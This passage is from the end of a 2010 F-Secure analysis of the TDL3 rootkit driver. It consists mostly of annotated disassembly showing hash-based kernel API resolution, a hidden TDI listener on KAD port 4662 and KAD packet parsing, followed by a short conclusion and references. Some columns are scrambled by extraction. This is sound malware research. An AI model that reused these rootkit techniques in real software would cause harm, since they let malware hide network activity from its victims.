[esi+_WORK_QUEUE_ITEM.WorkerRoutine],
eax
.text:100048A6
mov
[esi+_WORK_QUEUE_ITEM.Parameter], esi
.text:100048A9
mov
[esi+_WORK_QUEUE_ITEM.List.Flink], edi
.text:100048AB
call
FindKernel_bySidtCall
.text:100048AB
.text:100048B0
push
eax
.text:100048B1
call
FindAPIbyHash
.text:100048B1
.text:100048B6
push
1
.text:100048B8
push
esi
.text:100048B9
call
eax
; ExQueueWorkItem
.text:100048B9
.text:100048BB
.text:100048BB SetUp_UpDown_loadingFiles:
; CODE XREF:
WorkerRoutine_ForTCPandUDP+AEj
.text:100048BB
;
WorkerRoutine_ForTCPandUDP+C5j
.text:100048BB
mov
eax, ds:0FFDF0308h
.text:100048C0
push
1236h
; KAD Protocol
Standard Port for Up/Downloading files = 4662
.text:100048C5
push
edi
.text:100048C6
add
eax, 690h
.text:100048CB
push
eax
.text:100048CC
lea
eax, [ebp+device_tcp]
.text:100048CF
push
eax
.text:100048D0 /*
.text:100048D0 kd> dt _OBJECT_ATTRIBUTES f7bc6f14 -r
.text:100048D0 nt!_OBJECT_ATTRIBUTES
.text:100048D0
+0x000 Length
: 0x18
.text:100048D0
+0x004 RootDirectory
: (null)
.text:100048D0
+0x008 ObjectName
: 0xf7bc6f48 _UNICODE_STRING
"\device\tcp"
.text:100048D0
+0x000 Length
: 0x16
.text:100048D0
+0x002 MaximumLength
: 0x18
.text:100048D0
+0x004 Buffer
: 0xf7bc6f74 "\device\tcp"
.text:100048D0
+0x00c Attributes
: 0x240
.text:100048D0
+0x010 SecurityDescriptor : (null)
.text:100048D0
+0x014 SecurityQualityOfService : (null)
.text:100048D0 */
.text:100048D0
call
TDIOpenTransport
.text:100048D0
.text:100048D5
test
eax, eax
.text:100048D7
jl
short loc_10004917
.text:100048D7
.text:100048D9
push
ebx
.text:100048DA
call
FindKernel_bySidtCall
.text:100048DA
.text:100048DF
push
eax
.text:100048E0
call
FindAPIbyHash
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

44 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:100048E0
.text:100048E5
.text:100048E7
.text:100048E8
.text:100048E8
.text:100048EA
.text:100048EC
.text:100048EE
.text:100048EE
.text:100048F0
.text:100048F0
.text:100048F5
TDLListenForConnection
.text:100048FA
ExQueueWorkItem
.text:100048FF
eax
.text:10004902
.text:10004905
.text:10004907
.text:10004907
.text:1000490C
.text:1000490D
.text:1000490D
.text:10004912
.text:10004914
.text:10004915

push
push
call

10h
edi
eax

mov
cmp
jz

esi, eax
esi, edi
short loc_10004917

call

ComputeDelta

add

eax, 0F578272Ch ; xref :

push

7E91282h

mov

[esi+_WORK_QUEUE_ITEM.WorkerRoutine],

mov
mov
call

[esi+_WORK_QUEUE_ITEM.Parameter], esi
[esi+_WORK_QUEUE_ITEM.List.Flink], edi
FindKernel_bySidtCall

push
call

eax
FindAPIbyHash

push
push
call

1
esi
eax

; ExAllocatePool

; hash :

; ExQueueWorkItem

Opens KAD Service Port:
.text:10002292
push
.text:10002293
mov
.text:10002295
sub
.text:10002298
push
.text:10002299
push
.text:1000229A
mov
.text:1000229D
push
.text:1000229E
push
.text:1000229F
call
.text:1000229F
.text:100022A4
mov
.text:100022A6
xor
.text:100022A8
cmp
.text:100022AA
jl
.text:100022AA
.text:100022B0
mov
[esi+DEVICE_OBJECT.AttachedDevice]
.text:100022B3
mov
.text:100022B6
push
IoBuildDeviceIoControlRequest
.text:100022BB
mov
.text:100022C0
mov
.text:100022C3
call
.text:100022C3
.text:100022C8
push
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

ebp
ebp, esp
esp, 68h
ebx
esi
esi, [ebp+devobj]
edi
esi
TDIQueryAddress
edi, eax
ebx, ebx
edi, ebx
loc_100023FC
eax,
eax, [eax+DRIVER_OBJECT.DeviceObject]
0AA66EFD6h
; hash :
edi, 0C000009Ah
[ebp+devobj], eax
FindKernel_bySidtCall
eax

45 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:100022C9
call
FindAPIbyHash
.text:100022C9
.text:100022CE
push
ebx
.text:100022CF
push
ebx
.text:100022D0
push
1
.text:100022D2
push
ebx
.text:100022D3
push
ebx
.text:100022D4
push
ebx
.text:100022D5
push
ebx
.text:100022D6
push
[ebp+devobj]
.text:100022D9
push
3
.text:100022DB /*
.text:100022DB kd> !devobj 82cb7860
.text:100022DB Device object (82cb7860) is for:
.text:100022DB Tcp \Driver\Tcpip DriverObject 82c5e9a8
.text:100022DB Current Irp 00000000 RefCount 91 Type 00000012 Flags 00000050
.text:100022DB Dacl e1699c64 DevExt 00000000 DevObjExt 82cb7918
.text:100022DB ExtensionFlags (0000000000)
.text:100022DB Device queue is not busy.
.text:100022DB */
.text:100022DB
call
eax
;
IoBuildDeviceIoControlRequest
.text:100022DB
.text:100022DD
cmp
eax, ebx
.text:100022DF
mov
[ebp+devobj], eax
.text:100022E2
jz
loc_100023FC
.text:100022E2
.text:100022E8
mov
edi, 2C655ACDh ; hash : nt!memset
.text:100022ED
push
edi
.text:100022EE
call
FindKernel_bySidtCall
.text:100022EE
.text:100022F3
push
eax
.text:100022F4
call
FindAPIbyHash
.text:100022F4
.text:100022F9
push
2Eh
.text:100022FB
lea
ecx,
[ebp+_TDI_CONNECTION_INFORMATION.UserDataLength]
.text:100022FE
push
ebx
.text:100022FF
push
ecx
.text:10002300
call
eax
; memset
.text:10002300
.text:10002302
add
esp, 0Ch
.text:10002305
lea
eax,
[ebp+_TA_IP_ADDRESS.TAAdressCount]
.text:10002308
push
edi
.text:10002309
mov
[ebp+_TDI_CONNECTION_INFORMATION.RemoteAddressLength], 16h
.text:10002310
mov
[ebp+_TDI_CONNECTION_INFORMATION.RemoteAddress], eax
.text:10002313
mov
[ebp+_TA_IP_ADDRESS.TAAdressCount], 1
.text:1000231A
mov
[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP.AdressLength], 0Eh
.text:10002320
mov
[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP.AdressType], TDI_ADDRESS_TYPE_IP

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

46 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:10002326
mov
[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.in_addr], ebx
.text:10002329
mov
[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.sin_port], bx
.text:1000232D
call
FindKernel_bySidtCall
.text:1000232D
.text:10002332
push
eax
.text:10002333
call
FindAPIbyHash
.text:10002333
.text:10002338
push
2Eh
.text:1000233A
lea
ecx,
[ebp+__TDI_CONNECTION_INFORMATION.UserDataLength]
.text:1000233D
push
ebx
.text:1000233E
push
ecx
.text:1000233F
call
eax
; memset
.text:1000233F
.text:10002341
mov
ecx, [ebp+devobj]
.text:10002344
mov
[ebp+__TDI_CONNECTION_INFORMATION.RemoteAddressLength], 16h
.text:1000234B
mov
[ebp+__TA_IP_ADDRESS.TAAdressCount], 1
.text:10002352
mov
[ebp+__TA_IP_ADDRESS._TA_ADDRESS_IP.AdressLength], 0Eh
.text:10002358
mov
[ebp+__TA_IP_ADDRESS._TA_ADDRESS_IP.AdressType], TDI_ADDRESS_TYPE_IP
.text:1000235E
mov
[ebp+__TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.in_addr], ebx
.text:10002361
mov
[ebp+__TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.sin_port], bx
.text:10002365
lea
eax,
[ebp+__TA_IP_ADDRESS.TAAdressCount]
.text:10002368
mov
[ebp+__TDI_CONNECTION_INFORMATION.RemoteAddress], eax
.text:1000236B
mov
eax, dword ptr
[ecx+IRP.Tail.Overlay.anonymous_1.anonymous_0] ; IO_STACK_LOCATION
.text:1000236E
mov
[eax-8], ebx
;
_IO_STACK_LOCATION.CompletionRoutine
.text:10002371
mov
[eax-4], ebx
;
_IO_STACK_LOCATION.Context
.text:10002374
mov
[eax-21h], bl
;
_IO_STACK_LOCATION.Control
.text:10002377
sub
eax, 24h
.text:1000237A
mov
eax, [ecx+60h] ; IO_STACK_LOCATION
.text:1000237D
sub
eax, 24h
.text:10002380
mov
[eax+IO_STACK_LOCATION.MajorFunction],
IRP_MJ_INTERNAL_DEVICE_CONTROL
.text:10002383
mov
[eax+IO_STACK_LOCATION.MinorFunction],
TDI_LISTEN
.text:10002387
mov
edx, [esi+10h]
.text:1000238A
mov
edx, [edx+_FILE_OBJECT.DeviceObject]
.text:1000238D
mov
[eax+IO_STACK_LOCATION.DeviceObject],
edx
.text:10002390
mov
edx, [esi+8]
.text:10002393
mov
[eax+IO_STACK_LOCATION.FileObject],
edx

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

47 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:10002396
lea
edx,
[ebp+_TDI_CONNECTION_INFORMATION.UserDataLength]
.text:10002399
mov
[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength], edx
.text:1000239C
mov
[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.OutputBufferLength], ebx
.text:1000239F
lea
edx,
[ebp+__TDI_CONNECTION_INFORMATION.UserDataLength]
.text:100023A2
mov
[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.IoControlCode], edx
.text:100023A5
add
esp, 0Ch
.text:100023A8
lea
eax, [ebp+var_8]
.text:100023AB
push
eax
.text:100023AC
mov
eax, [esi+10h]
.text:100023AF
push
[eax+_FILE_OBJECT.DeviceObject]
.text:100023B2
push
ecx
.text:100023B3
call
TDICall
.text:100023B3
.text:100023B8
mov
edi, eax
.text:100023BA
cmp
edi, ebx
.text:100023BC
jl
short loc_100023FC
.text:100023BC
.text:100023BE /*
.text:100023BE
Change Endiannes
.text:100023BE */
.text:100023BE
mov
ecx,
[ebp+__TDI_CONNECTION_INFORMATION.RemoteAddress]
.text:100023C1
mov
eax, [ecx+0Ah] ;
TA_ADDRESS.TA_ADDRESS_IP.TDI_ADDRESS_IP.in_addr
.text:100023C4
mov
edx, eax
.text:100023C6
mov
[ebp+devobj], eax ; AABBCCDD
.text:100023C9
and
eax, 0FF00h
; 0000CC00
.text:100023CE
shl
edx, 10h
; CCDD0000
.text:100023D1
or
edx, eax
; CCDDCC00
.text:100023D3
.text:100023D3
xor
eax, eax
.text:100023D5
mov
ah, byte ptr [ebp+devobj+2] ; 0000BB00
.text:100023D8
shl
edx, 8
; DDCC0000
.text:100023DB
.text:100023DB
or
edx, eax
; DDCCBB00
.text:100023DD
movzx
eax, byte ptr [ecx+0Dh] ; 000000AA
.text:100023E1
or
edx, eax
; DDCCBBAA
.text:100023E3
mov
eax, [ebp+in_addr]
Returns Opened Port and IP address:
.text:100023E6
mov
[eax], edx
.text:100023E8
movzx
eax, word ptr [ecx+8] ;
TA_ADDRESS.TA_ADDRESS_IP.TDI_ADDRESS_IP.sin_port
.text:100023EC
movzx
cx, ah
.text:100023F0
shl
eax, 8
.text:100023F3
add
cx, ax
.text:100023F6
mov
eax, [ebp+port]
.text:100023F9
mov
[eax], cx
.text:100023F9
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

48 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Setup TDI Receive Event for accepting UDP connections:

.text:100025E9

push
2Eh
.text:100025EB
lea
ecx,
[ebp+_TDI_CONNECTION_INFORMATION.UserDataLength] ; ReceiveInfo Buffer
.text:100025EE
push
ebx
.text:100025EF
push
ecx
.text:100025F0
call
eax
; memset
.text:100025F0
.text:100025F2
mov
[ebp+_TDI_CONNECTION_INFORMATION.RemoteAddressLength], 16h
.text:100025F9
mov
[ebp+_TA_IP_ADDRESS.TAAdressCount], 1
.text:10002600
mov
[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP.AdressLength], 0Eh
.text:10002606
mov
[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP.AdressType], TDI_ADDRESS_TYPE_IP
.text:1000260C
mov
[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.in_addr], ebx
.text:1000260F
mov
[ebp+_TA_IP_ADDRESS._TA_ADDRESS_IP._TDI_ADDRESS_IP.sin_port], bx
.text:10002613
lea
eax,
[ebp+_TA_IP_ADDRESS.TAAdressCount]
.text:10002616
mov
[ebp+_TDI_CONNECTION_INFORMATION.RemoteAddress], eax
.text:10002619
mov
eax, dword ptr
[esi+IRP.Tail.Overlay.anonymous_1.anonymous_0] ; IO_STACK_LOCATION of next
lower driver's I/O
.text:1000261C /*
.text:1000261C
Package IOCTL Request Packet
.text:1000261C
Setup ClientEventReceiveDatagram
.text:1000261C */
.text:1000261C
mov
[eax-8], ebx
;
_IO_STACK_LOCATION.CompletionRoutine
.text:1000261F
mov
[eax-4], ebx
;
_IO_STACK_LOCATION.Context
.text:10002622
mov
[eax-21h], bl
;
_IO_STACK_LOCATION.Control = METHOD_BUFFERED
.text:10002625
sub
eax, 24h
; point to next io
stack
.text:10002628
mov
eax, dword ptr
[esi+IRP.Tail.Overlay.anonymous_1.anonymous_0]
.text:1000262B /*
.text:1000262B
IoStack = next IrpStackLocation
.text:1000262B */
.text:1000262B
sub
eax, 24h
; point to CURRENT
IO_STACK_LOCATION
.text:1000262E
mov
[eax+IO_STACK_LOCATION.MajorFunction],
IRP_MJ_INTERNAL_DEVICE_CONTROL
.text:10002631
mov
[eax+IO_STACK_LOCATION.MinorFunction],
TDI_RECEIVE_DATAGRAM
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

49 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:10002635
mov
ecx, [edi+10h]
.text:10002638
mov
ecx, [ecx+_FILE_OBJECT.DeviceObject]
.text:1000263B
mov
[eax+IO_STACK_LOCATION.DeviceObject],
ecx
.text:1000263E
mov
ecx, [edi+10h]
.text:10002641
mov
[eax+IO_STACK_LOCATION.FileObject],
ecx ; FileObject
.text:10002644
mov
ecx, [ebp+_buffer_size_]
.text:10002647
mov
[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.OutputBufferLength], ecx
.text:1000264A
lea
ecx, [ebp+InputBufferLength]
.text:1000264D
mov
[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength], ecx
.text:10002650
mov
[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.Type3InputBuffer], 20h
.text:10002657
lea
ecx,
[ebp+_TDI_CONNECTION_INFORMATION.UserDataLength]
.text:1000265A
mov
[eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.IoControlCode], ecx
.text:1000265D
mov
eax, [ebp+buffer_ffdf0308_678_mdl] ;
_MDL
.text:10002660
mov
[esi+IRP.MdlAddress], eax
.text:10002663
add
esp, 0Ch
.text:10002666 /*
.text:10002666 kd> dt _IO_STATUS_BLOCK f5a02cf8
.text:10002666 nt!_IO_STATUS_BLOCK
.text:10002666
+0x000 Status
: -2100336419
.text:10002666
+0x000 Pointer
: 0x82cf68dd
.text:10002666
+0x004 Information
: 8
.text:10002666 */
.text:10002666
lea
eax,
[ebp+IO_STATUS_BLOCK.anonymous.status]
.text:10002669
push
eax
.text:1000266A
mov
eax, [edi+10h]
.text:1000266D
push
[eax+_FILE_OBJECT.DeviceObject]
.text:10002670
push
esi
; IRP
.text:10002671 /*
.text:10002671
TDIQueryDeviceControl
.text:10002671 */
.text:10002671
call
TDICall
.text:10002671
When UDP packet is received, checks validity of KAD packet:
.text:100045D7
.text:100045DA
.text:100045DD
0xE4 standard packet
.text:100045DD
zlib Compressed packets
.text:100045E2
.text:100045E2
.text:100045E4
KAD_ZLIB_COMPRESSED_PACKET
.text:100045E5
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

movzx
add
sub

eax, byte ptr [esi]
esp, 14h
eax, KAD_STANDARD_PACKET ; eMule-Kad =
;

jz

short KAD_StandardPacket

dec

eax

jnz

_RECEIVE_MORE_

0xE5

;

50 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Checks whether a HandShake is being initiated and sends necessary reply:
.text:10004638 KAD_StandardPacket:
; CODE XREF:
TDIReceiveDatagram+13Cj
.text:10004638
mov
edi, [ebp+BUFFER]
.text:10004638
.text:1000463B
.text:1000463B check_values_in_buffer:
; CODE XREF:
TDIReceiveDatagram+190j
.text:1000463B
movzx
eax, [esi+kad_protocol.Opcode]
.text:1000463F
cmp
eax, KAD_SEARCH_RES ;
<HASH(KEY)[16]><CNT1[2]><HASH(ANSWER)[16]><CNT2[2]><META>*(CNT2))*(CNT1)
.text:10004642
jg
short KAD_PUBLISHED_or_FIREWALLED
.text:10004642
.text:10004644
jz
_RECEIVE_MORE_
.text:10004644
.text:1000464A
cmp
eax, KAD_HELLO_REQ ;
<PEER(SENDER)[25]>
.text:1000464D
jz
short KAD_HELLO_REQUEST
.text:1000464D
.text:1000464F
cmp
eax, KAD_HELLO_RES ;
<PEER(RECEIVER)[25]>
.text:10004652
jz
short KAD_HELLO_RESPONSE
.text:10004652
.text:10004654
cmp
eax, KAD_REQ
;
<TYPE[1]><HASH(TARGET)[16]><HASH(RECEIVER)[16]>
.text:10004657
jz
short KAD_REQUEST
.text:10004657
.text:10004659
cmp
eax, KAD_RES
;
<HASH(TARGET)[16]><CNT><PEER[25]>*(CNT)
Checks for Publish Requests:
.text:100046AA KAD_PUBLISHED_or_FIREWALLED:
; CODE XREF:
TDIReceiveDatagram+19Cj
.text:100046AA
sub
eax, KAD_PUBLISH_REQ ;
<HASH(KEY)[16]<CNT1[2]><HASH(TARGET)[16]><CNT2[2]><META>*(CNT2)*(CNT1)
.text:100046AD
jz
short KAD_PUBLISH_REQUEST
.text:100046AD
.text:100046AF
sub
eax, 8
; KAD_PUBLISH_RES
.text:100046B2
jz
_RECEIVE_MORE_
.text:100046B2
.text:100046B8
sub
eax, 8
; KAD_FIREWALLED_REQ
.text:100046BB
jz
short KAD_FIREWALLED_REQUEST
.text:100046BB
.text:100046BD
sub
eax, 8
; KAD_FIREWALLED_RES
.text:100046C0
jz
short KAD_FIREWALLED_RESPONSE
.text:100046C0

Figure XVIII Early KAD Funtionalities

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

51 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Base on the functions seen in the malware, the majority of the functions are involved
in Response. Handshake functionality is supported, but the necessary bootstrap
functions to join a KAD network are not. Furthermore, when a PUBLISH request is
received the malware only stores details from the received request, which is expected
to be “string” information(s); no further action is taken. Should this be taken as an
indication that the malware is spying on KAD networks?

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

52 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

VI.12 Related Works and References

TDL3 analysis - http://rootbiez.blogspot.com/2009/11/rootkit-tdl3-why-so-serious-letsput.html

Exploiting KAD - http://ccr.sigcomm.org/online/files/p65-steiner.pdf
Performance Evaluation of KAD - http://www.di.unipi.it/~ricci/MasterThesisBrunner.pdf
File Caching - http://msdn.microsoft.com/en-us/library/aa364218(VS.85).aspx
For symbol information - http://msdn.microsoft.com/en-us/library/default.aspx
For sample code implementations - http://www.osronline.com/

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

53 / 53